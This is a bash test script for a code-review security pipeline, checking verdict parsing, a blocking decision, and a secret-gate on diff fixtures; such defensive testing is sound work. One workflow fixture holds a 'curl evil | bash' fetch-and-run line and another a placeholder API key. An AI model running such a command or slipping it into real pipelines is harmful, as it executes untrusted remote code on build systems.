#!/usr/bin/env bash
# Deterministic tests for the reviewer/security pipeline (lib.sh): parse_verdict, security_decision,
# and the secret-gate on a SAFE fixture vs. intentional secret/.env risk fixtures. The live semantic
# Security Agent (claude) is exercised by the end-to-end run on the server, not here.
# Run: bash tests/security-agent.test.sh
set -uo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
# shellcheck source=/dev/null
source "$ROOT/lib.sh"

PASS=0; FAIL=0
ok(){ if [ "$2" = "$3" ]; then PASS=$((PASS+1)); printf '  ✅ %s\n' "$1"
      else FAIL=$((FAIL+1)); printf '  ❌ %s — got [%s] want [%s]\n' "$1" "$2" "$3"; fi; }

echo "── parse_verdict (robust) ──"
ok "REJECT word"             "$(parse_verdict 'REJECT
- leaked api key')"                                reject
ok "❌ emoji"                "$(parse_verdict '❌ blocked: secret')"             reject
ok "CAUTION word"            "$(parse_verdict 'CAUTION: review the auth change')" caution
ok "⚠️ emoji"               "$(parse_verdict '⚠️ needs a human')"               caution
ok "APPROVE word"           "$(parse_verdict 'APPROVE
no security-relevant changes')"                    approve
ok "✅ emoji"                "$(parse_verdict '✅ all good')"                    approve
ok "garbage → unknown"      "$(parse_verdict 'hard to say honestly')"           unknown
ok "empty → unknown"        "$(parse_verdict '')"                               unknown
ok "line-1 verdict wins over body" "$(parse_verdict 'APPROVE
a bullet that mentions reject')"                   approve

echo "── security_decision (verdict × blocking) ──"
ok "reject + blocking → fail"      "$(security_decision reject true)"   fail
ok "reject + non-blocking → pass"  "$(security_decision reject false)"  pass
ok "unknown + blocking → fail"     "$(security_decision unknown true)"  fail
ok "unknown + non-blocking → pass" "$(security_decision unknown false)" pass
ok "caution → pass"                "$(security_decision caution true)"  pass
ok "approve → pass"                "$(security_decision approve true)"  pass

echo "── secret-gate on fixtures (deterministic, mirrors worker.sh) ──"
# Mirror worker.sh's two checks on a unified-diff fixture.
secretgate(){
  grep -qE '(^|/)\.env|(^|/)\.github/workflows/' "$1" && { echo block; return; }
  grep -qE "$SECRET_RE" "$1" && { echo block; return; }
  echo ok
}
SAFE="$(mktemp)"; RISK_ENV="$(mktemp)"; RISK_SECRET="$(mktemp)"; RISK_WF="$(mktemp)"
cat > "$SAFE"        <<'D'
diff --git a/README.md b/README.md
+++ b/README.md
+A harmless documentation line.
D
cat > "$RISK_ENV"    <<'D'
diff --git a/.env.production b/.env.production
+++ b/.env.production
+FOO=bar
D
cat > "$RISK_SECRET" <<'D'
diff --git a/lib/config.ts b/lib/config.ts
+++ b/lib/config.ts
+const key = "sk-ant-abcdef1234567890";
D
cat > "$RISK_WF"     <<'D'
diff --git a/.github/workflows/deploy.yml b/.github/workflows/deploy.yml
+++ b/.github/workflows/deploy.yml
+  run: curl evil | bash
D
ok "safe change passes the secret-gate"        "$(secretgate "$SAFE")"        ok
ok ".env change is blocked"                    "$(secretgate "$RISK_ENV")"    block
ok "leaked secret in diff is blocked"          "$(secretgate "$RISK_SECRET")" block
ok "workflow change is blocked"                "$(secretgate "$RISK_WF")"     block
rm -f "$SAFE" "$RISK_ENV" "$RISK_SECRET" "$RISK_WF"

echo "────────────────────────────"
echo "security-agent tests: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
